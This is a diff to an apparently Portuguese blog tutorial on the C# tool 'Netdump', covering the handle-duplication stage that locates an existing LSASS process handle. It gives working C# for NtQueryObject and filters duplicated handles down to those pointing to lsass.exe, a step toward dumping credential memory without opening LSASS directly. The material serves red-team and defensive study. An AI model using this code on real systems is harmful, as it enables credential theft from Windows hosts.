@@ -68,7 +68,7 @@ Podemos notar que, de todos os handles abertos ao LSASS, dois são do tipo "proc
 
 ![Desktop View](https://i.imgur.com/1RQOTf1.png)
 
-Maravilha! Como mostrado acima, duas permissões estão atribuídas ao handle LSASS: `PROCESS_VM_READ` e `PROCESS_QUERY_INFORMATION⁴`. É exatamente esta última permissão que nos permite ler a memória do processo, técnica popularmente conhecida como "dump". Agora, vamos dar uma mergulhada no mundo das Windows API. =]
+Maravilha! Como mostrado acima, duas permissões estão atribuídas ao handle LSASS: `PROCESS_VM_READ` e `PROCESS_QUERY_INFORMATION⁴`. É exatamente esta primeira permissão que nos permite ler a memória do processo, técnica popularmente conhecida como "dump". Agora, vamos dar uma mergulhada no mundo das Windows API. =]
 
 > - `PROCESS_QUERY_INFORMATION⁴`: permissão necessária para descobrir certas informações sobre um processo, como token, código de saída e classe de prioridade.
 {: .prompt-info }
@@ -285,4 +285,91 @@ Netdump.Invokes.CloseHandle(hDuplicate);
 Netdump.Invokes.CloseHandle(hObject);
 ```
 
-Para duplicarmos um handle, precisamos de uma permissão crucial: `PROCESS_DUP_HANDLE⁹`. É esta permissão que será solicitada na abertura de um novo handle ao processo alvo (o de PID 6020, conforme visto no Process Hacker. É este processo que queremos porque é ele que possui o handle pro LSASS). Feito isso, é chamada a API para a duplicação do handle. O `hObject` é o identificador do handle que queremos duplicar. Pegamos este identificador graças a API `NtQuerySystemInformation`. E, por último, representado pelo `hDuplicate`, o handle duplicado! Mas não se engane: este ainda não é o handle do LSASS! :P
+Para duplicar o handle, é necessário um privilégio essencial: `PROCESS_DUP_HANDLE⁹`. Feito isso, após a abertura de um novo handle ao processo alvo (o que foi destacado no Process Hacker), é realizada a chamada da API. Ela terá como resultado um novo handle, referenciado como `hDuplicate`, que será o duplicado. Mas, não se enganem, não é tão fácil assim. :P
+
+> - `PROCESS_DUP_HANDLE⁹`: permissão necessária para duplicar um handle.
+{: .prompt-info }
+
+## NtQueryObject¹⁰
+
+> - `NtQueryObject¹⁰`: API utilizada para filtrar informações de um objeto.
+{: .prompt-info }
+
+Chegando aos passos finais, vamos filtrar o tipo de handle que está sendo duplicado. Existem diversas modalidades deles, como handles de: "Process", "Keys", "Files", "Threads", entre outros. O tipo de handle que precisamos é da categoria "Process". Dito isso, uma API que filtra por esse tipo de informação é a `NtQueryObject`.
+
+```csharp
+public enum OBJECT_INFORMATION_CLASS : uint
+{
+	ObjectBasicInformation = 0,
+	ObjectNameInformation = 1,
+	ObjectTypeInformation = 2,
+	ObjectAllTypesInformation = 3,
+	ObjectHandleInformation = 4
+}
+
+[DllImport("ntdll.dll", SetLastError = true)]
+public static extern NTSTATUS NtQueryObject(
+	IntPtr Handle,
+	Netdump.Tables.OBJECT_INFORMATION_CLASS ObjectInformationClass,
+	IntPtr ObjectInformation,
+	int ObjectInformationLength,
+	ref int ReturnLength
+);
+```
+
+Similarmente a API `NtQuerySystemInformation`, também não sabemos o tamanho do resultado que a função retornará. Logo, também será necessário um loop para verificar quando a API retorna `STATUS_INFO_LENGTH_MISMATCH`.
+
+```csharp
+var objTypeInfo = new Netdump.Tables.OBJECT_TYPE_INFORMATION();
+var ObjectInformationLength = Marshal.SizeOf(objTypeInfo);
+var ObjectInformation = Marshal.AllocHGlobal(ObjectInformationLength);
+
+var returnLength = 0;
+
+while (Netdump.Invokes.NtQueryObject(
+	hDuplicate,
+	Netdump.Tables.OBJECT_INFORMATION_CLASS.ObjectTypeInformation,
+	ObjectInformation,
+	ObjectInformationLength,
+	ref returnLength
+) == Netdump.Tables.NTSTATUS.STATUS_INFO_LENGTH_MISMATCH)
+
+{
+	ObjectInformationLength = returnLength;
+	Marshal.FreeHGlobal(ObjectInformation);
+	ObjectInformation = Marshal.AllocHGlobal(ObjectInformationLength);
+}
+```
+
+> - `OBJECT_INFORMATION_CLASS`: um enum que representa o tipo de informação que será retornado do objeto.
+{: .prompt-info }
+
+A lógica continua a mesma: a cada vez que a API retornar o erro de `STATUS_INFO_LENGTH_MISMATCH`, mais memória será alocada ao `ObjectInformationLength` até completar o valor necessário para cobrir a resposta da API.
+
+```csharp
+objTypeInfo = (Netdump.Tables.OBJECT_TYPE_INFORMATION)Marshal.PtrToStructure(ObjectInformation, typeof(Netdump.Tables.OBJECT_TYPE_INFORMATION));
+
+var objTypeInfoBuf = new byte[objTypeInfo.TypeName.Length];
+
+Marshal.Copy(objTypeInfo.TypeName.Buffer, objTypeInfoBuf, 0, objTypeInfo.TypeName.Length);
+
+var pathExe = Encoding.Unicode.GetString(objTypeInfoBuf);
+
+int buffer = 1024;
+
+var fileNameBuilder = new StringBuilder(buffer);
+uint bufferLength = (uint)fileNameBuilder.Capacity + 1;
+
+string hexValue = "0x" + hDuplicate.ToString("X");
+
+if (pathExe.Equals("Process", StringComparison.OrdinalIgnoreCase))
+{
+	if (Netdump.Invokes.QueryFullProcessImageName(hDuplicate, 0, fileNameBuilder, ref bufferLength))
+	{
+		if (fileNameBuilder.ToString().EndsWith("lsass.exe"))
+		{
+			Console.WriteLine($"[+] {hexValue}, PID: {Netdump.Invokes.GetProcessId(hDuplicate)}, Path: {fileNameBuilder.ToString()}");
+		}
+	}
+}
+```
